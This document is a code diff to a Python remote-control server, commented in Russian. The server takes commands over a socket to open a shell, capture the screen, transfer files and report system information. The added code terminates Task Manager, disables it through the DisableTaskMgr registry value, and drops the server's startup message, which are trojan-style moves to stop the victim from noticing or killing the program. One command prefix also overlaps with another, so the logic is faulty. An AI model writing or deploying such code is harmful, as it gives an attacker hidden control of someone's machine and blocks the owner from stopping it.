@@ -4,7 +4,7 @@ import os
 import webbrowser
 import platform
 import time
-
+import winreg
 import psutil
 
 from PIL import ImageGrab
@@ -21,11 +21,13 @@ PORT = 8080       # Порт для подключения
 server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 server_socket.bind((HOST, PORT))
 server_socket.listen(1)
-print("Сервер запущен")
+
+
 
 #conn, addr = server_socket.accept()
 def heandle_client(conn, addr):
 
+   
 
     current_dir = os.getcwd()  # Текущая директория сервера
 
@@ -35,15 +37,18 @@ def heandle_client(conn, addr):
             
             command = conn.recv(4096).decode("utf-8").strip()
 
+
+
+
             if command.lower() == 'exit':
                 break
 
             
-            if command.lower() == 'close_server':
+            elif command.lower() == 'close_server':
                 conn.close()
                 server_socket.close()
 
-            elif command.startswith("open_cmd") or command.startswith("0"):
+            elif command.startswith("open_cmd"):
                 # Открыть калькулятор
                 if os.name == "nt":  # Windows
                     subprocess.Popen("cmd.exe")
@@ -100,6 +105,51 @@ def heandle_client(conn, addr):
                     conn.send(b"FILE_TRANSFER_END")
                 else:
                     conn.send("Ошибка: Файл не найден.".encode("utf-8"))
+                
+            elif command == "task_manager" or command.startswith("7"):
+                # Удаление процесса диспетчера задач
+                try:
+                    task_manager_name = "Taskmgr.exe" if os.name == "nt" else "task-manager"  # Название процесса
+                    killed = False
+                    for proc in psutil.process_iter(['name']):
+                        if proc.info['name'] == task_manager_name:
+                            proc.terminate()
+                            killed = True
+                            conn.send(f"Процесс {task_manager_name} завершён.".encode("utf-8"))
+                            break
+                    if not killed:
+                        conn.send(f"Процесс {task_manager_name} не найден.".encode("utf-8"))
+                except Exception as e:
+                    conn.send(f"Ошибка при попытке завершить процесс: {str(e)}".encode("utf-8"))
+
+            
+
+            elif command == "task_manager_disab":
+                try:
+                    # Открываем ветку реестра
+                    reg_key_path = r"Software\Microsoft\Windows\CurrentVersion\Policies\System"
+                    reg_key = winreg.CreateKey(winreg.HKEY_CURRENT_USER, reg_key_path)
+                    
+                    # Устанавливаем значение DisableTaskMgr = 1
+                    winreg.SetValueEx(reg_key, "DisableTaskMgr", 0, winreg.REG_DWORD, 1)
+                    winreg.CloseKey(reg_key)
+                    print("Диспетчер задач отключён.")
+                except Exception as e:
+                    print(f"Ошибка: {str(e)}")
+
+            elif command == "task_manager_enab": 
+                try:
+                    # Удаляем ключ DisableTaskMgr
+                    reg_key_path = r"Software\Microsoft\Windows\CurrentVersion\Policies\System"
+                    reg_key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, reg_key_path, 0, winreg.KEY_SET_VALUE)
+                    winreg.DeleteValue(reg_key, "DisableTaskMgr")
+                    winreg.CloseKey(reg_key)
+                    print("Диспетчер задач включён.")
+                except FileNotFoundError:
+                    print("Диспетчер задач уже включён.")
+                except Exception as e:
+                    print(f"Ошибка: {str(e)}")
+
 
         
             elif command == "get_system_info" or command.startswith("7"):
@@ -197,6 +247,7 @@ def heandle_client(conn, addr):
 while True:
     try:
         conn, addr = server_socket.accept()
+        
         heandle_client(conn, addr)
     except KeyboardInterrupt:
         print("\nСервер завершает работу.")
